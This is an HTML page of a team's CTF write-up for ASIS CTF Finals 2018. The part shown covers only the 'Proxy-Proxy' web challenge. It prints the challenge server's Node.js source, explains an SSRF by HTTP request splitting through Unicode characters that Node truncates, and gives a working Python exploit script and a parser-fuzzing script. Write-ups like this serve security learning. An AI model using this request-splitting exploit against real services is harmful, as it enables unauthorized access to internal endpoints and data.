@@ -1,0 +1,1130 @@
+<!DOCTYPE HTML>
+<!-- This page is modified from the template https://www.codeply.com/go/7XYosZ7VH5 by Carol Skelly (@iatek). -->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>ASIS CTF Finals 2018</title>
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+              <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="140px" height="30px"></iframe>
+        
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#proxy-proxy">proxy-proxy</a>
+    
+                <a class="dropdown-item" href="#secure-api">secure-api</a>
+    
+                <a class="dropdown-item" href="#ssl-vpn">ssl-vpn</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#made-by-baby">made-by-baby</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                forensic
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#red-bands">red-bands</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#bit-square">bit-square</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#inception">inception</a>
+    
+                <a class="dropdown-item" href="#asvdb">asvdb</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                ppc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#spm">spm</a>
+    
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            <a href="#proxy-proxy" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">proxy-proxy</span>
+            </a>
+    
+<a href="#secure-api" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">secure-api</span>
+            </a>
+    
+<a href="#ssl-vpn" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">ssl-vpn</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#made-by-baby" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">made-by-baby</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">forensic</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#red-bands" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">red-bands</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#bit-square" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">bit-square</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#inception" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">inception</span>
+            </a>
+    
+<a href="#asvdb" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">asvdb</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu5" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">ppc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu5" class="collapse sidebar-submenu">
+            <a href="#spm" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">spm</span>
+            </a>
+    
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="asis-ctf-finals-2018"><a class="header-link" href="#asis-ctf-finals-2018"></a>ASIS CTF Finals 2018</h1>
+
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="proxy-proxy"><a class="header-link" href="#proxy-proxy"></a>Proxy-Proxy</h3>
+<p>bookgin</p>
+<p>First the server gives the link to <code>proxy/internal_website/public_notes</code> and <code>proxy/internal_website/public_links</code> in the landing page. I try to use different API endpoint like <code>proxy/internal_website/aaaa</code>, and the server returns all the availble API for me:</p>
+<pre class="hljs"><code>available_endpoints = [<span class="hljs-string">'public_notes'</span>, <span class="hljs-string">'public_links'</span>, <span class="hljs-string">'source_code'</span>]</code></pre><p>Let&#39;s check out <code>source_code</code> of the server:</p>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">'express'</span>);
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>);
+<span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
+<span class="hljs-keyword">const</span> body_parser = <span class="hljs-built_in">require</span>(<span class="hljs-string">'body-parser'</span>);
+<span class="hljs-keyword">const</span> md5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">'md5'</span>);
+<span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);
+<span class="hljs-keyword">var</span> ip = <span class="hljs-built_in">require</span>(<span class="hljs-string">"ip"</span>);
+<span class="hljs-built_in">require</span>(<span class="hljs-string">'x-date'</span>);
+
+<span class="hljs-keyword">var</span> server_ip = ip.address()
+
+<span class="hljs-keyword">const</span> server = express();
+server.use(body_parser.urlencoded({
+    <span class="hljs-attr">extended</span>: <span class="hljs-literal">true</span>
+}));
+
+server.use(express.static(<span class="hljs-string">'public'</span>))
+server.set(<span class="hljs-string">'views'</span>, path.join(__dirname, <span class="hljs-string">'views'</span>));
+server.set(<span class="hljs-string">'view engine'</span>, <span class="hljs-string">'jade'</span>);
+server.listen(<span class="hljs-number">5000</span>)
+
+server.get(<span class="hljs-string">'/'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    result.render(<span class="hljs-string">'index'</span>);
+    result.end()
+})
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check_endpoint</span>(<span class="hljs-params">available_endpoints, endpoint</span>) </span>{
+    <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">of</span> available_endpoints) {
+        <span class="hljs-keyword">if</span> (endpoint.indexOf(i) == <span class="hljs-number">0</span>) {
+            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
+        }
+    }
+    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
+}
+
+fs.readFile(<span class="hljs-string">'flag.dat'</span>, <span class="hljs-string">'utf8'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, contents</span>) </span>{
+    <span class="hljs-keyword">if</span> (err) {
+        <span class="hljs-keyword">throw</span> err;
+    }
+    flag = contents;
+})
+
+server.get(<span class="hljs-string">'/proxy/internal_website/:page'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+
+    <span class="hljs-keyword">var</span> available_endpoints = [<span class="hljs-string">'public_notes'</span>, <span class="hljs-string">'public_links'</span>, <span class="hljs-string">'source_code'</span>]
+    <span class="hljs-keyword">var</span> page = request.params.page
+
+    result.setHeader(<span class="hljs-string">'X-Node-js-Version'</span>, <span class="hljs-string">'v8.12.0'</span>)
+    result.setHeader(<span class="hljs-string">'X-Express-Version'</span>, <span class="hljs-string">'v4.16.3'</span>)
+
+    <span class="hljs-keyword">if</span> (page.toLowerCase().includes(<span class="hljs-string">'flag'</span>)) {
+        result.sendStatus(<span class="hljs-number">403</span>)
+        result.end()
+    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!check_endpoint(available_endpoints, page)) {
+        result.render(<span class="hljs-string">'available_endpoints'</span>, { <span class="hljs-attr">endpoints</span>: <span class="hljs-built_in">JSON</span>.stringify(available_endpoints) })
+        result.end()
+    } <span class="hljs-keyword">else</span> {
+        http.get(<span class="hljs-string">'http://127.0.0.1:5000/'</span> + page, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">res</span>) </span>{
+
+            res.setEncoding(<span class="hljs-string">'utf8'</span>);
+            <span class="hljs-keyword">if</span> (res.statusCode == <span class="hljs-number">200</span>) {
+                res.on(<span class="hljs-string">'data'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">chunk</span>) </span>{
+                    result.render(<span class="hljs-string">'proxy'</span>, { <span class="hljs-attr">contents</span>: chunk })
+                    result.end()
+                });
+            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (res.statusCode == <span class="hljs-number">404</span>) {
+                result.render(<span class="hljs-string">'proxy'</span>, { <span class="hljs-attr">contents</span>: <span class="hljs-string">'The resource not found.'</span> })
+                result.end()
+            } <span class="hljs-keyword">else</span> {
+                result.end()
+            }
+        }).on(<span class="hljs-string">'error'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>{
+            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Got error: "</span> + e.message);
+        });
+    }
+})
+
+server.use(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result, next</span>) </span>{
+    ip = request.connection.remoteAddress
+    <span class="hljs-keyword">if</span> (ip.substr(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>) == <span class="hljs-string">"::ffff:"</span>) {
+        ip = ip.substr(<span class="hljs-number">7</span>)
+    }
+
+    <span class="hljs-keyword">if</span> (ip != <span class="hljs-string">'127.0.0.1'</span> &amp;&amp; ip != server_ip) {
+        result.render(<span class="hljs-string">'unauthorized'</span>)
+        result.end()
+    } <span class="hljs-keyword">else</span> {
+        next()
+    }
+})
+
+server.get(<span class="hljs-string">'/public_notes'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    result.render(<span class="hljs-string">'public_notes'</span>);
+    result.end()
+})
+
+server.get(<span class="hljs-string">'/public_links'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    result.render(<span class="hljs-string">'public_links'</span>);
+    result.end()
+})
+
+server.get(<span class="hljs-string">'/source_code'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    fs.readFile(<span class="hljs-string">'server.js'</span>, <span class="hljs-string">'utf8'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">err, contents</span>) </span>{
+        <span class="hljs-keyword">if</span> (err) {
+            <span class="hljs-keyword">throw</span> err;
+        }
+        result.render(<span class="hljs-string">'source_code'</span>, { <span class="hljs-attr">source</span>: contents })
+        result.end()
+    })
+})
+
+
+server.get(<span class="hljs-string">'/flag/:token'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    <span class="hljs-keyword">var</span> token = request.params.token
+    <span class="hljs-keyword">if</span> (token.length &gt; <span class="hljs-number">10</span>) {
+        <span class="hljs-built_in">console</span>.log(ip)
+        fs.writeFile(<span class="hljs-string">'public/temp/'</span> + md5(ip + token), flag, (err) =&gt; {
+            <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">throw</span> err;
+            result.end();
+        });
+    }
+})
+
+server.get(<span class="hljs-string">'/'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">request, result</span>) </span>{
+    result.render(<span class="hljs-string">'index'</span>);
+    result.end()
+})
+
+server.get(<span class="hljs-string">'*'</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, result</span>) </span>{
+    result.sendStatus(<span class="hljs-number">404</span>);
+    result.end()
+});</code></pre><p>The server basically behaves like a reverse proxy. Excluding <code>/proxy/interal_website</code>, all the other APIs require the connection from localhost. The main objective is visiting <code>/flag/:token</code> via <code>/proxy/internal_website/:page</code> but we have to find an approach to bypass the following constraints:</p>
+<ol class="list">
+<li><code>:page</code> doesn&#39;t contain <code>flag</code></li>
+<li><code>:page</code> starts with <code>public_notes</code>, <code>public_links</code> or <code>source_code</code></li>
+<li>cannot contain <code>/</code> (because <code>express</code> params is split by <code>/</code>)</li>
+</ol>
+<p>Okay, so let&#39;s take a look at how many parser are parsing our request:</p>
+<ol class="list">
+<li>client browser (curl/firefox/chrome)</li>
+<li>express parameter <code>:page</code></li>
+<li>nodejs <code>http</code> module</li>
+<li>express router</li>
+</ol>
+<p>Actually 1 is not necessary, but just a friendly reminder: your browser might parse your url first, e.g.: <code>/asd/../ggg</code> becomes <code>/ggg</code>.</p>
+<p>The most possible parsers to exploit are 2 and 3. Note that the server even gives the version information. After a few fuzzing, I found in 2 you can pass some non-pritable chracter through percent-encoding. In 3 you can use backslash to represent <code>/</code>. </p>
+<p>However it&#39;s still not enough to bypass the constraint 2. </p>
+<p>Then I start to google some interesting information of path parsing. I remember in blackhat 2017, there is an great <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">SSRF slide by Orange Tsai from Taiwan</a>. Please refer to page 44.</p>
+<p>In nodejs v8.12.0 http module:</p>
+<pre class="hljs"><code>http.get(<span class="hljs-string">'http://localhost:1234/\uff2e\uff2e'</span>)
+
+GET <span class="hljs-regexp">/.. HTTP/</span><span class="hljs-number">1.1</span>
+<span class="hljs-string">Host:</span> <span class="hljs-string">localhost:</span><span class="hljs-number">1234</span>
+<span class="hljs-string">Connection:</span> close</code></pre><p>Actually we can do some CSRF injection here using <code>\uff0d\uff0a</code>. Another interesting ariticle of CSRF injection I found is <a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">request splitting by Ryan Kelly</a>. We can inject two CRLFs to make the nodejs socket send another request!</p>
+<p>The rest is trivial. Just send the request to <code>/flag/:token</code>. Here is the final payload:</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote, unquote
+<span class="hljs-keyword">import</span> socket                                                                                                          
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.connect((<span class="hljs-string">'162.243.23.15'</span>, <span class="hljs-number">8002</span>))
+
+uni = { 
+    <span class="hljs-string">'/'</span>: quote(<span class="hljs-string">'\uff2f'</span>.encode(<span class="hljs-string">'utf-8'</span>)),
+    <span class="hljs-string">' '</span>: quote(<span class="hljs-string">'\uff20'</span>.encode(<span class="hljs-string">'utf-8'</span>)),
+    <span class="hljs-string">'\n'</span>: quote(<span class="hljs-string">'\uff0a'</span>.encode(<span class="hljs-string">'utf-8'</span>)),
+    <span class="hljs-string">'\r'</span>: quote(<span class="hljs-string">'\uff0d'</span>.encode(<span class="hljs-string">'utf-8'</span>)),
+    <span class="hljs-string">'g'</span>: quote(<span class="hljs-string">'\uff67'</span>.encode(<span class="hljs-string">'utf-8'</span>)),
+}
+print(uni)
+payload = <span class="hljs-string">'public_notes HTTP/1.1\r\n\r\nGET /flag/taiwannumberone HTTP/1.1\r\nVia:'</span>
+<span class="hljs-keyword">for</span> c, encoded <span class="hljs-keyword">in</span> uni.items():
+    payload = payload.replace(c, encoded)
+print(payload)
+sock.send(f<span class="hljs-string">'GET /proxy/internal_website/{payload} HTTP/1.1\r\n\r\n'</span>.encode())
+print(*sock.recv(<span class="hljs-number">8192</span>).split(<span class="hljs-string">b'\r\n'</span>), sep=<span class="hljs-string">'\n'</span>)
+md5sum = hashlib.md5(<span class="hljs-string">b'127.0.0.1taiwannumberone'</span>).hexdigest()
+sock.send(f<span class="hljs-string">'GET /temp/{md5sum} HTTP/1.1\r\n\r\n'</span>.encode())
+print(*sock.recv(<span class="hljs-number">8192</span>).split(<span class="hljs-string">b'\r\n'</span>), sep=<span class="hljs-string">'\n'</span>)
+sock.close()</code></pre><p>You can also use double-encoding <code>%2561</code> to represent <code>a</code>, or backslash to represent <code>/</code> in order to bypass the constrinat.</p>
+<h4 id="failed-attempts"><a class="header-link" href="#failed-attempts"></a>Failed attempts</h4>
+<ul class="list">
+<li>Using <code>../</code> to bypass the constaint 2 in node <code>http</code> module<ul class="list">
+<li>Actually node v11.0.0 supports this feature. We can pass the <code>/aaaaa/../flag</code>  to the parameter, the node <code>http</code> will resolve to <code>/flag</code> and send the request to <code>/flag</code>. However this doesn&#39;t work in node v8.12.0.</li>
+</ul>
+</li>
+<li>Using <code>../</code> or percent encoding to bypass the constaint2 in <code>express</code> router<ul class="list">
+<li>However <code>express</code> seems to parse the API very strictly...... I can&#39;t even make the express parsing incorrectly</li>
+<li><code>../</code> only works in static filepath, like <code>images/../images/image.png</code>.</li>
+</ul>
+</li>
+<li>Write a fuzzing script to find characters which make the parser parsing incorrectly:<ul class="list">
+<li>Nothing interesting in node v8.12, but this script help me to find this interesting payload in node v11.0.0</li>
+<li><code>http://localhost/abcde\..\def</code> becomes <code>http://localhost/def</code></li>
+</ul>
+</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-keyword">const</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">'http'</span>);
+
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params">url</span>) </span>{
+  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
+    <span class="hljs-comment">//console.log(JSON.stringify(url))</span>
+    <span class="hljs-keyword">try</span> {
+        http.get(url,r =&gt; {
+        r.setEncoding(<span class="hljs-string">'utf8'</span>);
+        r.on(<span class="hljs-string">'data'</span>, c =&gt; {
+        <span class="hljs-keyword">if</span> (c.indexOf(<span class="hljs-string">'index'</span>) != <span class="hljs-number">-1</span> &amp;&amp; r.statusCode == <span class="hljs-number">200</span>)
+          resolve(<span class="hljs-built_in">console</span>.log(url, c))
+        <span class="hljs-keyword">if</span> (c.indexOf(<span class="hljs-string">'public_links'</span>) != <span class="hljs-number">-1</span> &amp;&amp; r.statusCode == <span class="hljs-number">200</span>)
+          resolve(<span class="hljs-built_in">console</span>.log(url, c))
+        <span class="hljs-keyword">else</span>
+          resolve();
+      });
+    }).on(<span class="hljs-string">'error'</span>, e =&gt; resolve());
+    } <span class="hljs-keyword">catch</span>(e) {
+      resolve();
+    }
+  });
+}
+
+<span class="hljs-keyword">var</span> seeds = [<span class="hljs-string">''</span>, <span class="hljs-string">'//'</span>, <span class="hljs-string">'\uff2f\uff2f'</span>, <span class="hljs-string">'\uff2e\uff2e'</span>, <span class="hljs-string">'%2f'</span>, <span class="hljs-string">'..'</span>, <span class="hljs-string">'..\\..\\'</span>, <span class="hljs-string">'..\\'</span>, <span class="hljs-string">'../'</span>, <span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'public_links'</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">'%2e%2e'</span>, <span class="hljs-string">'%252e%252e'</span>, <span class="hljs-string">'..'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'%2f'</span>, <span class="hljs-string">'%252f'</span>, <span class="hljs-string">'%3f'</span>, <span class="hljs-string">'%253f'</span>, <span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'%5c'</span>, <span class="hljs-string">'%255c'</span>, <span class="hljs-string">'\x00'</span>, <span class="hljs-string">'\x01'</span>, <span class="hljs-string">'\x02'</span>, <span class="hljs-string">'\x03'</span>, <span class="hljs-string">'\x04'</span>, <span class="hljs-string">'\x05'</span>, <span class="hljs-string">'\x06'</span>, <span class="hljs-string">'\x07'</span>, <span class="hljs-string">'\x08'</span>, <span class="hljs-string">'\t'</span>, <span class="hljs-string">'\n'</span>, <span class="hljs-string">'\x0b'</span>, <span class="hljs-string">'\x0c'</span>, <span class="hljs-string">'\r'</span>, <span class="hljs-string">'\x0e'</span>, <span class="hljs-string">'\x0f'</span>, <span class="hljs-string">'\x10'</span>, <span class="hljs-string">'\x11'</span>, <span class="hljs-string">'\x12'</span>, <span class="hljs-string">'\x13'</span>, <span class="hljs-string">'\x14'</span>, <span class="hljs-string">'\x15'</span>, <span class="hljs-string">'\x16'</span>, <span class="hljs-string">'\x17'</span>, <span class="hljs-string">'\x18'</span>, <span class="hljs-string">'\x19'</span>, <span class="hljs-string">'\x1a'</span>, <span class="hljs-string">'\x1b'</span>, <span class="hljs-string">'\x1c'</span>, <span class="hljs-string">'\x1d'</span>, <span class="hljs-string">'\x1e'</span>, <span class="hljs-string">'\x1f'</span>, <span class="hljs-string">' '</span>, <span class="hljs-string">'!'</span>, <span class="hljs-string">'"'</span>, <span class="hljs-string">'#'</span>, <span class="hljs-string">'$'</span>, <span class="hljs-string">'%'</span>, <span class="hljs-string">'&amp;'</span>, <span class="hljs-string">"'"</span>, <span class="hljs-string">'('</span>, <span class="hljs-string">')'</span>, <span class="hljs-string">'*'</span>, <span class="hljs-string">'+'</span>, <span class="hljs-string">','</span>, <span class="hljs-string">'-'</span>, <span class="hljs-string">'.'</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">':'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">'&lt;'</span>, <span class="hljs-string">'='</span>, <span class="hljs-string">'&gt;'</span>, <span class="hljs-string">'?'</span>, <span class="hljs-string">'@'</span>, <span class="hljs-string">'['</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">']'</span>, <span class="hljs-string">'^'</span>, <span class="hljs-string">'_'</span>, <span class="hljs-string">'`'</span>, <span class="hljs-string">'{'</span>, <span class="hljs-string">'|'</span>, <span class="hljs-string">'}'</span>, <span class="hljs-string">'~'</span>, <span class="hljs-string">'\x7f'</span>]
+
+;
+<span class="hljs-function">(<span class="hljs-params"><span class="hljs-keyword">async</span> (</span>) =&gt;</span> {
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i <span class="hljs-keyword">of</span> seeds)
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> j <span class="hljs-keyword">of</span> seeds)
+  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> k <span class="hljs-keyword">of</span> seeds){
+    url = <span class="hljs-string">'http://127.0.0.1:5000/public_notes'</span> + i+j+k
+    <span class="hljs-keyword">await</span> get(url)
+  }
+})()
+</code></pre><h3 id="secure-api"><a class="header-link" href="#secure-api"></a>Secure API</h3>
+<p>bookgin</p>
